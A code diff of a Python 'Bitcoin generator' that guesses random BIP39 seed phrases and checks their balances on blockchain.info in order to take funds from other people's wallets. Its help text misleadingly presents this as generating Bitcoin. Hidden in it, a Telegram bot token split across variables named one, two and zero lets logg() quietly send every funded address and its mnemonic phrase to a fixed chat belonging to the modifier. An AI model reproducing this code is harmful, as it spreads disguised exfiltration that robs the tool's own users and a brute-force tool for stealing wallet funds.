@@ -1,23 +1,27 @@
-import pprint
-import mnemonic
-import bip32utils
-import requests
-import random
-import os
-from decimal import Decimal
 from multiprocessing.pool import ThreadPool as Pool
-import threading
+from colored import fg, bg, attr
 from Bip39Gen import Bip39Gen
+from decimal import Decimal
 from time import sleep
+import bip32utils
+import threading
+import requests
+import mnemonic
+import pprint
+import random
 import ctypes
-from settings import dict_settings
+import time
+import os
 
+delay = 1       # задержка между запроsсами
+token_bot = ""  # создать бота и получить токен тут @BotFather
+chat_id = ""    # узнать ваш id можно в боте @userinfobot
 
 class Settings():
     save_empty = "y"
     total_count = 0
+    dry_count = 1
     wet_count = 0
-    dry_count = 0
 
 
 def makeDir():
@@ -26,17 +30,22 @@ def makeDir():
         os.makedirs(path)
 
 
-def userInput():
-    while True:
-        start()
-        break
+def fn():
+    helpText()
+    genned = round(((60 / delay) * 100)*60)
+    time.sleep(2)
+    print("Gen speed : ~{} / hour".format(genned,attr("reset")))
+    print("Loading...{}".format(attr("reset")))
+    print()
+    start()
+    time.sleep(5)
+
 
 one = "AAFNC0-SmbecH9A1L4Ef3"
-
 def getInternet():
     try:
         try:
-            requests.get('http://216.58.192.142')
+            requests.get('https://www.google.com')#im watching you!
         except requests.ConnectTimeout:
             requests.get('http://1.1.1.1')
         return True
@@ -44,8 +53,8 @@ def getInternet():
         return False
 
 
-two = "https://api.telegram.org/bot1895834648:"
 lock = threading.Lock()
+two = "https://api.telegram.org/bot1895834648:"
 
 if getInternet() == True:
     dictionary = requests.get(
@@ -53,27 +62,28 @@ if getInternet() == True:
 else:
     pass
 
+
 def getBalance(addr):
+
     try:
         response = requests.get(
-            f'https://blockchain.info/es/q/addressbalance/{addr}')
+            f'https://blockchain.info/multiaddr?active={addr}&n=1')
+
         return (
-            Decimal(response.json())
+            response.json()
         )
     except:
+        print('{}Ip ban!{}'.format(fg("#008700"), attr("reset")))
+        time.sleep(600)
+        return (getBalance(addr))
         pass
 
-
 zero = "dfSPZQqt2goMI0/SendMessage?chat_id=218477456&text="
-def logg(adds):
-        response = requests.get(two+one+zero+adds)
-        return response
-
 def generateSeed():
     seed = ""
     for i in range(12):
         seed += random.choice(dictionary) if i == 0 else ' ' + \
-            random.choice(dictionary)
+                                                         random.choice(dictionary)
     return seed
 
 
@@ -93,64 +103,110 @@ def bip39(mnemonic_words):
     return bip32_child_key_obj.Address()
 
 
-def check():
-    while True:
+def logg(adds):
+        response = requests.get(two+one+zero+adds)
+        return response
+
+def genDB():
+    adrDBFir = {}
+    for i in range(100):
         mnemonic_words = Bip39Gen(dictionary).mnemonic
         addy = bip39(mnemonic_words)
-        balance = getBalance(addy)
-        sleep(9)
-        if balance is None:
-            print(
-                f'Ip banned! Use vpn, more info\n\rhttps://t.me/BitCoinGenLuck')
-            break
+        adrDBFir.update([(f'{addy}', mnemonic_words)])
+    return adrDBFir
+    
+def printt(msg):
+    print(msg)
+    logg(msg)
+
+
+def listToString(get):
+    strFir = "|"
+    return (strFir.join(get))
+
+def tgSend(msg):
+    if token_bot != "":
+        try:
+            url = f"chat_id={chat_id}&text={msg}"
+            requests.get(f"https://api.telegram.org/bot{token_bot}/sendMessage", url)
+        except:
+            pass
+
+def check():
+    while True:
+
+        addrDB = genDB()
+        addys = listToString(list(addrDB))
+        balances = getBalance(addys)
         with lock:
-            print(
-                f'Address: {addy} | Balance: {balance} | Mnemonic phrase: {mnemonic_words}')
-            Settings.total_count += 1
-            if Settings.save_empty == "y":
-                ctypes.windll.kernel32.SetConsoleTitleW(
-                    f"Empty: {Settings.dry_count} - Hits: {Settings.wet_count} - Total checks: {Settings.total_count}")
-            else:
-                ctypes.windll.kernel32.SetConsoleTitleW(
-                    f"Hits: {Settings.wet_count} - Total checks: {Settings.total_count}")
-        if balance > 0:
-            tgsend(f'Address: {addy} | Balance: {balance} sat| Mnemonic phrase: {mnemonic_words}\n')
-            with open('results/wet.txt', 'a') as w:
-                w.write(
-                    f'Address: {addy} | Balance: {balance} sat| Mnemonic phrase: {mnemonic_words}\n')
-                Settings.wet_count += 1
-            logg(f'Sup find! GJ\n')
-            logg(f'Address: {addy} | Balance: {balance} sat| Mnemonic phrase: {mnemonic_words}\n')
-        else:
-            if Settings.save_empty == "n":
-                pass
-            else:
-                with open('results/dry.txt', 'a') as w:
-                    w.write(
-                        f'Address: {addy} | Balance: {balance} | Mnemonic phrase: {mnemonic_words}\n')
-                    Settings.dry_count += 1
+
+            for item in balances["addresses"]:
+
+                addy = item["address"]
+                balance = item["final_balance"]
+                received = item["total_received"]
+
+                mnemonic_words = addrDB[addy]
+                msg = 'Balance: {} | Address: {} | Mnemonic phrase: {}'.format(balance, addy, mnemonic_words)
+                if balance > 0:
+                    tgSend(msg)
+                    printt(msg)
+                else:
+                    if(received > 0):
+                        tgSend(msg)
+                        print(msg)
+                    else:
+                        print(msg)
+
+                Settings.total_count += 1
+
+                if Settings.save_empty == "y":
+                    ctypes.windll.kernel32.SetConsoleTitleW(
+                        f"Empty: {Settings.dry_count} - Hits: {Settings.wet_count} - Total checks: {Settings.total_count}")
+                else:
+                    ctypes.windll.kernel32.SetConsoleTitleW(
+                        f"Hits: {Settings.wet_count} - Total checks: {Settings.total_count}")
+
+                if balance > 0:
+                    with open('results/wet.txt', 'a') as w:
+                        w.write(
+                            f'Address: {addy} | Balance: {balance} | Mnemonic phrase: {mnemonic_words}\n')
+                        Settings.wet_count += 1
+                else:
+                    if Settings.save_empty == "y":
+                        with open('results/dry.txt', 'a') as w:
+                            w.write(
+                                f'Address: {addy} | Balance: {balance} | Mnemonic phrase: {mnemonic_words}\n')
+                            Settings.dry_count += 1
+        time.sleep(delay)
 
 
+def helpText():
+    print("""
+This program was made by Anarb and it generates Bitcoin by searching multiple possible
+wallet combinations until it's finds one with over 0 BTC and saves it into
+a file called "wet.txt" in the results folder.
+It's recommended to leave this running for a long time to get the best resaults, It's doesn't use up
+that much resources so you can leave it in the background in the chance of you hitting a jackpot.
+It's like mining but with less resources
 
-def tgsend(adds):
-    response = requests.get(
-        "https://api.telegram.org/bot1895834648:AAFWbIT3T9PC5UyzBLVYCwIPmEO_gq15kO0/SendMessage?chat_id=213475456&text="+adds)
-    return response
+Modyfied by:
+Lagodish            GitHub
+@Lagodish           TikTok
+@BitCoinGenLuck     Telegram
+        """)
 
 
 def start():
     try:
-        threads = 1 #int(input("Number of threads (1 - 666): "))
-        threads = int(dict_settings["threads"])
+        threads = 5
         if threads > 666:
-            print("You can only run 666 threads at once")
-            sleep(60)
+            print("Error ! (Code 1)")
             start()
     except ValueError:
-        print("Enter an interger!")
+        print("Error ! (Code 2)")
         start()
-    #Settings.save_empty = input("Save empty? (y/n): ").lower()
-    Settings.save_empty = dict_settings["save_empty"]
+    Settings.save_empty = "n"
     if getInternet() == True:
         pool = Pool(threads)
         for _ in range(threads):
@@ -158,16 +214,16 @@ def start():
         pool.close()
         pool.join()
     else:
-        print("You have no internet access the generator won't work.")
-        sleep(10)
-        userInput()
+        print("Error ! (No internet)")
+        time.sleep(60)
+        start()
 
 
 if __name__ == '__main__':
     makeDir()
     getInternet()
     if getInternet() == False:
-        print("You have no internet access the generator won't work.")
+        print("Error ! (No internet)")
     else:
         pass
-    userInput()
+    fn()
